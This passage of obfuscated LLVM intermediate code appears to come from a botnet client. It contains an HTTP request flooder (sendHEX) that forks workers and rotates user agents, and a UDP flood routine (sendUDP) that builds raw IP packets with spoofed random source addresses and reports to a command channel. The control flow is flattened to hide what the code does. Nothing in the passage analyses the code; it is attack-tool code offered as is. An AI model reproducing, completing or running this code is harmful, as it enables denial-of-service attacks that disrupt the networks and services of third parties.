  %82 = call i8* @strcpy(i8* %81, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.83, i32 0, i32 0)) #2
  %83 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %84 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %85 = call i64 @strlen(i8* %84) #10
  %86 = getelementptr inbounds i8, i8* %83, i64 %85
  %87 = call i32 @rand() #2
  %88 = sext i32 %87 to i64
  %89 = urem i64 %88, 3
  %90 = getelementptr inbounds [3 x i8*], [3 x i8*]* %13, i64 0, i64 %89
  %91 = load i8*, i8** %90, align 8
  %92 = call i8* @strcpy(i8* %86, i8* %91) #2
  %93 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %94 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %95 = call i64 @strlen(i8* %94) #10
  %96 = getelementptr inbounds i8, i8* %93, i64 %95
  %97 = call i8* @strcpy(i8* %96, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.84, i32 0, i32 0)) #2
  %98 = load i32, i32* %8, align 4
  %99 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %100 = getelementptr inbounds [512 x i8], [512 x i8]* %11, i32 0, i32 0
  %101 = call i64 @strlen(i8* %100) #10
  %102 = call i64 @write(i32 %98, i8* %99, i64 %101)
  %103 = load i32, i32* %8, align 4
  %104 = getelementptr inbounds [1 x i8], [1 x i8]* %10, i32 0, i32 0
  %105 = call i64 @read(i32 %103, i8* %104, i64 1)
  %106 = load i32, i32* %8, align 4
  %107 = call i32 @close(i32 %106)
  store i32 -1102554406, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %110 = sext i32 %109 to i64
  %111 = load i64, i64* %9, align 8
  %112 = load i32, i32* %6, align 4
  %113 = sext i32 %112 to i64
  %114 = add nsw i64 %111, %113
  %115 = icmp sge i64 %110, %114
  %116 = select i1 %115, i32 540538533, i32 -261760403
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  call void @_exit(i32 0) #12
  unreachable

; <label>:118:                                    ; preds = %loopEntry
  store i32 353596736, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  store i32 -2114555680, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %7, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %7, align 4
  store i32 -1473478789, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %120, %119, %118, %108, %39, %31, %30, %26, %21, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHEX(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  %19 = alloca [2048 x i8], align 16
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %20 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %21 = load i32, i32* %11, align 4
  %22 = add nsw i32 %20, %21
  store i32 %22, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %23 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %24 = call i32 (i8*, i8*, ...) @sprintf(i8* %23, i8* getelementptr inbounds ([265 x i8], [265 x i8]* @.str.85, i32 0, i32 0))
  store i32 0, i32* %14, align 4
  %switchVar = alloca i32
  store i32 317646111, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 317646111, label %25
    i32 -1680850233, label %30
    i32 1022553506, label %44
    i32 1716829843, label %45
    i32 -1043293403, label %50
    i32 -1622656286, label %57
    i32 -1195658381, label %68
    i32 -1674871100, label %69
    i32 1860560537, label %70
    i32 537017823, label %71
    i32 235728600, label %74
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i32, i32* %14, align 4
  %27 = load i32, i32* %12, align 4
  %28 = icmp slt i32 %26, %27
  %29 = select i1 %28, i32 -1680850233, i32 235728600
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i32 0, i32 0
  %34 = load i8*, i8** %8, align 8
  %35 = call i32 @rand() #2
  %36 = srem i32 %35, 36
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [32 x i8*], [32 x i8*]* @useragents, i64 0, i64 %37
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 (i8*, i8*, ...) @sprintf(i8* %31, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.86, i32 0, i32 0), i8* %32, i8* %33, i8* %34, i8* %39)
  %41 = call i32 @fork() #2
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 1022553506, i32 1860560537
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 1716829843, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %15, align 4
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = icmp sgt i32 %46, %47
  %49 = select i1 %48, i32 -1043293403, i32 -1674871100
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %8, align 8
  %52 = load i16, i16* %9, align 2
  %53 = call i32 @socket_connect(i8* %51, i16 zeroext %52)
  store i32 %53, i32* %13, align 4
  %54 = load i32, i32* %13, align 4
  %55 = icmp ne i32 %54, 0
  %56 = select i1 %55, i32 -1622656286, i32 -1195658381
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %13, align 4
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %61 = call i64 @strlen(i8* %60) #10
  %62 = call i64 @write(i32 %58, i8* %59, i64 %61)
  %63 = load i32, i32* %13, align 4
  %64 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %65 = call i64 @read(i32 %63, i8* %64, i64 1)
  %66 = load i32, i32* %13, align 4
  %67 = call i32 @close(i32 %66)
  store i32 -1195658381, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 1716829843, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:70:                                     ; preds = %loopEntry
  store i32 537017823, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %14, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %14, align 4
  store i32 317646111, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %71, %70, %68, %57, %50, %45, %44, %30, %25, %switchDefault
  br label %loopEntry
}

declare i32 @sprintf(i8*, i8*, ...) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = load i32, i32* %10, align 4
  store i32 %35, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1824084521, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %8
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1824084521, label %first
    i32 608390347, label %38
    i32 1532348219, label %42
    i32 851299983, label %47
    i32 1350636263, label %53
    i32 184762336, label %54
    i32 -1914361243, label %61
    i32 9264921, label %66
    i32 -2057091201, label %69
    i32 1767606246, label %77
    i32 361248893, label %78
    i32 -94271027, label %88
    i32 -1141733605, label %99
    i32 1514242245, label %103
    i32 -178820840, label %107
    i32 -538413014, label %112
    i32 916406433, label %113
    i32 -1607356222, label %114
    i32 1398017702, label %121
    i32 1634532093, label %125
    i32 -502662191, label %128
    i32 497176066, label %129
    i32 -11033565, label %134
    i32 291086189, label %137
    i32 2010396127, label %143
    i32 1607748867, label %146
    i32 -749190173, label %147
    i32 -163802748, label %152
    i32 129600933, label %157
    i32 1133173875, label %161
    i32 -587278921, label %162
    i32 151275712, label %168
    i32 -2058601807, label %208
    i32 -418657645, label %210
    i32 -1232165844, label %215
    i32 -1503697733, label %240
    i32 1805493978, label %241
    i32 -2082116556, label %254
    i32 526759234, label %256
    i32 -924518274, label %261
    i32 -132560112, label %288
    i32 690939384, label %293
    i32 130144054, label %294
    i32 183097130, label %295
    i32 366402629, label %302
    i32 562601776, label %306
    i32 -405186212, label %309
    i32 -2035801654, label %311
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %36 = icmp eq i32 %.reload, 0
  %37 = select i1 %36, i32 608390347, i32 1532348219
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = call i32 @rand_cmwc()
  %40 = trunc i32 %39 to i16
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %40, i16* %41, align 2
  store i32 851299983, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #13
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  store i32 851299983, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i8*, i8** %9, align 8
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %50 = call i32 @getHost(i8* %48, %struct.in_addr* %49)
  %51 = icmp ne i32 %50, 0
  %52 = select i1 %51, i32 1350636263, i32 184762336
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  store i32 -2035801654, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %56 = getelementptr inbounds [8 x i8], [8 x i8]* %55, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 8, i32 4, i1 false)
  %57 = load i32, i32* %14, align 4
  store i32 %57, i32* %18, align 4
  %58 = load i32, i32* %12, align 4
  %59 = icmp eq i32 %58, 32
  %60 = select i1 %59, i32 -1914361243, i32 497176066
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %62, i32* %19, align 4
  %63 = load i32, i32* %19, align 4
  %64 = icmp ne i32 %63, 0
  %65 = select i1 %64, i32 -2057091201, i32 9264921
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* @mainCommSock, align 4
  %68 = call i32 (i32, i8*, ...) @sockprintf(i32 %67, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.87, i32 0, i32 0))
  store i32 -2035801654, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %13, align 4
  %71 = add nsw i32 %70, 1
  %72 = sext i32 %71 to i64
  %73 = call noalias i8* @malloc(i64 %72) #2
  store i8* %73, i8** %20, align 8
  %74 = load i8*, i8** %20, align 8
  %75 = icmp eq i8* %74, null
  %76 = select i1 %75, i32 1767606246, i32 361248893
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 -2035801654, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %20, align 8
  %80 = load i32, i32* %13, align 4
  %81 = add nsw i32 %80, 1
  %82 = sext i32 %81 to i64
  call void @llvm.memset.p0i8.i64(i8* %79, i8 0, i64 %82, i32 1, i1 false)
  %83 = load i8*, i8** %20, align 8
  %84 = load i32, i32* %13, align 4
  call void @RandString(i8* %83, i32 %84)
  %85 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %86 = load i32, i32* %11, align 4
  %87 = add nsw i32 %85, %86
  store i32 %87, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  store i32 -94271027, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %19, align 4
  %90 = load i8*, i8** %20, align 8
  %91 = load i32, i32* %13, align 4
  %92 = sext i32 %91 to i64
  %93 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %94 = call i64 @sendto(i32 %89, i8* %90, i64 %92, i32 0, %struct.sockaddr* %93, i32 16)
  %95 = load i32, i32* %22, align 4
  %96 = load i32, i32* %18, align 4
  %97 = icmp eq i32 %95, %96
  %98 = select i1 %97, i32 -1141733605, i32 -1607356222
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* %10, align 4
  %101 = icmp eq i32 %100, 0
  %102 = select i1 %101, i32 1514242245, i32 -178820840
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = call i32 @rand_cmwc()
  %105 = trunc i32 %104 to i16
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %105, i16* %106, align 2
  store i32 -178820840, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %109 = load i32, i32* %21, align 4
  %110 = icmp sgt i32 %108, %109
  %111 = select i1 %110, i32 -538413014, i32 916406433
  store i32 %111, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  store i32 -502662191, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  store i32 0, i32* %22, align 4
  store i32 -94271027, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %22, align 4
  %116 = add i32 %115, 1
  store i32 %116, i32* %22, align 4
  %117 = load i32, i32* %23, align 4
  %118 = load i32, i32* %15, align 4
  %119 = icmp eq i32 %117, %118
  %120 = select i1 %119, i32 1398017702, i32 1634532093
  store i32 %120, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load i32, i32* %16, align 4
  %123 = mul nsw i32 %122, 1000
  %124 = call i32 @usleep(i32 %123)
  store i32 0, i32* %23, align 4
  store i32 -94271027, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load i32, i32* %23, align 4
  %127 = add i32 %126, 1
  store i32 %127, i32* %23, align 4
  store i32 -94271027, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 -2035801654, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %130, i32* %24, align 4
  %131 = load i32, i32* %24, align 4
  %132 = icmp ne i32 %131, 0
  %133 = select i1 %132, i32 291086189, i32 -11033565
  store i32 %133, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i32, i32* @mainCommSock, align 4
  %136 = call i32 (i32, i8*, ...) @sockprintf(i32 %135, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.87, i32 0, i32 0))
  store i32 -2035801654, i32* %switchVar
  br label %loopEnd

; <label>:137:                                    ; preds = %loopEntry
  store i32 1, i32* %25, align 4
  %138 = load i32, i32* %24, align 4
  %139 = bitcast i32* %25 to i8*
  %140 = call i32 @setsockopt(i32 %138, i32 0, i32 3, i8* %139, i32 4) #2
  %141 = icmp slt i32 %140, 0
  %142 = select i1 %141, i32 2010396127, i32 1607748867
  store i32 %142, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  %144 = load i32, i32* @mainCommSock, align 4
  %145 = call i32 (i32, i8*, ...) @sockprintf(i32 %144, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.88, i32 0, i32 0))
  store i32 -2035801654, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 50, i32* %26, align 4
  store i32 -749190173, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = load i32, i32* %26, align 4
  %149 = add nsw i32 %148, -1
  store i32 %149, i32* %26, align 4
  %150 = icmp ne i32 %148, 0
  %151 = select i1 %150, i32 -163802748, i32 129600933
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %154 = call i32 @rand_cmwc()
  %155 = xor i32 %153, %154
  call void @srand(i32 %155) #2
  %156 = call i32 @rand() #2
  call void @init_rand(i32 %156)
  store i32 -749190173, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i32, i32* %12, align 4
  %159 = icmp eq i32 %158, 0
  %160 = select i1 %159, i32 1133173875, i32 -587278921
  store i32 %160, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  store i32 0, i32* %27, align 4
  store i32 151275712, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  %163 = load i32, i32* %12, align 4
  %164 = sub nsw i32 32, %163
  %165 = shl i32 1, %164
  %166 = sub nsw i32 %165, 1
  %167 = xor i32 %166, -1
  store i32 %167, i32* %27, align 4
  store i32 151275712, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i32, i32* %13, align 4
  %170 = sext i32 %169 to i64
  %171 = add i64 28, %170
  store i64 %171, i64* %.reg2mem2
  %172 = call i8* @llvm.stacksave()
  store i8* %172, i8** %28, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %173 = alloca i8, i64 %.reload4, align 16
  store i8* %173, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %174 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %174, %struct.iphdr** %29, align 8
  %175 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %176 = bitcast %struct.iphdr* %175 to i8*
  %177 = getelementptr i8, i8* %176, i64 20
  %178 = bitcast i8* %177 to %struct.udphdr*
  store %struct.udphdr* %178, %struct.udphdr** %30, align 8
  %179 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %180 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %181 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %180, i32 0, i32 0
  %182 = load i32, i32* %181, align 4
  %183 = load i32, i32* %27, align 4
  %184 = call i32 @GetRandomIP(i32 %183)
  %185 = call i32 @htonl(i32 %184) #13
  %186 = load i32, i32* %13, align 4
  %187 = sext i32 %186 to i64
  %188 = add i64 8, %187
  %189 = trunc i64 %188 to i32
  call void @makeIPPacket(%struct.iphdr* %179, i32 %182, i32 %185, i8 zeroext 17, i32 %189)
  %190 = load i32, i32* %13, align 4
  %191 = sext i32 %190 to i64
  %192 = add i64 8, %191
  %193 = trunc i64 %192 to i16
  %194 = call zeroext i16 @htons(i16 zeroext %193) #13
  %195 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %196 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %195, i32 0, i32 0
  %197 = bitcast %union.anon.2* %196 to %struct.anon.3*
  %198 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %197, i32 0, i32 2
  store i16 %194, i16* %198, align 2
  %199 = call i32 @rand_cmwc()
  %200 = trunc i32 %199 to i16
  %201 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %202 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %201, i32 0, i32 0
  %203 = bitcast %union.anon.2* %202 to %struct.anon.3*
  %204 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %203, i32 0, i32 0
  store i16 %200, i16* %204, align 2
  %205 = load i32, i32* %10, align 4
  %206 = icmp eq i32 %205, 0
  %207 = select i1 %206, i32 -2058601807, i32 -418657645
  store i32 %207, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = call i32 @rand_cmwc()
  store i32 -1232165844, i32* %switchVar
  store i32 %209, i32* %.reg2mem10
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = load i32, i32* %10, align 4
  %212 = trunc i32 %211 to i16
  %213 = call zeroext i16 @htons(i16 zeroext %212) #13
  %214 = zext i16 %213 to i32
  store i32 -1232165844, i32* %switchVar
  store i32 %214, i32* %.reg2mem10
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %216 = trunc i32 %.reload11 to i16
  %217 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %218 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %217, i32 0, i32 0
  %219 = bitcast %union.anon.2* %218 to %struct.anon.3*
  %220 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %219, i32 0, i32 1
  store i16 %216, i16* %220, align 2
  %221 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %222 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %221, i32 0, i32 0
  %223 = bitcast %union.anon.2* %222 to %struct.anon.3*
  %224 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %223, i32 0, i32 3
  store i16 0, i16* %224, align 2
  %225 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %226 = bitcast %struct.udphdr* %225 to i8*
  %227 = getelementptr inbounds i8, i8* %226, i64 8
  %228 = load i32, i32* %13, align 4
  call void @RandString(i8* %227, i32 %228)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %229 = bitcast i8* %.reload8 to i16*
  %230 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i32 0, i32 2
  %232 = load i16, i16* %231, align 2
  %233 = zext i16 %232 to i32
  %234 = call zeroext i16 @csum(i16* %229, i32 %233)
  %235 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %236 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %235, i32 0, i32 7
  store i16 %234, i16* %236, align 2
  %237 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %238 = load i32, i32* %11, align 4
  %239 = add nsw i32 %237, %238
  store i32 %239, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  store i32 -1503697733, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  store i32 1805493978, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = load i32, i32* %24, align 4
  %243 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %244 = call i64 @sendto(i32 %242, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %243, i32 16)
  %245 = call i32 @rand_cmwc()
  %246 = trunc i32 %245 to i16
  %247 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %248 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %247, i32 0, i32 0
  %249 = bitcast %union.anon.2* %248 to %struct.anon.3*
  %250 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %249, i32 0, i32 0
  store i16 %246, i16* %250, align 2
  %251 = load i32, i32* %10, align 4
  %252 = icmp eq i32 %251, 0
  %253 = select i1 %252, i32 -2082116556, i32 526759234
  store i32 %253, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = call i32 @rand_cmwc()
  store i32 -924518274, i32* %switchVar
  store i32 %255, i32* %.reg2mem12
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  %257 = load i32, i32* %10, align 4
  %258 = trunc i32 %257 to i16
  %259 = call zeroext i16 @htons(i16 zeroext %258) #13
  %260 = zext i16 %259 to i32
  store i32 -924518274, i32* %switchVar
  store i32 %260, i32* %.reg2mem12
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  %262 = trunc i32 %.reload13 to i16
  %263 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %264 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %263, i32 0, i32 0
  %265 = bitcast %union.anon.2* %264 to %struct.anon.3*
  %266 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %265, i32 0, i32 1
  store i16 %262, i16* %266, align 2
  %267 = call i32 @rand_cmwc()
  %268 = trunc i32 %267 to i16
  %269 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 3
  store i16 %268, i16* %270, align 4
  %271 = load i32, i32* %27, align 4
  %272 = call i32 @GetRandomIP(i32 %271)
  %273 = call i32 @htonl(i32 %272) #13
  %274 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 8
  store i32 %273, i32* %275, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %276 = bitcast i8* %.reload6 to i16*
  %277 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 2
  %279 = load i16, i16* %278, align 2
  %280 = zext i16 %279 to i32
  %281 = call zeroext i16 @csum(i16* %276, i32 %280)
  %282 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 7
  store i16 %281, i16* %283, align 2
  %284 = load i32, i32* %32, align 4
  %285 = load i32, i32* %18, align 4
  %286 = icmp eq i32 %284, %285
  %287 = select i1 %286, i32 -132560112, i32 183097130
  store i32 %287, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %290 = load i32, i32* %31, align 4
  %291 = icmp sgt i32 %289, %290
  %292 = select i1 %291, i32 690939384, i32 130144054
  store i32 %292, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 -405186212, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  store i32 0, i32* %32, align 4
  store i32 -1503697733, i32* %switchVar
  br label %loopEnd

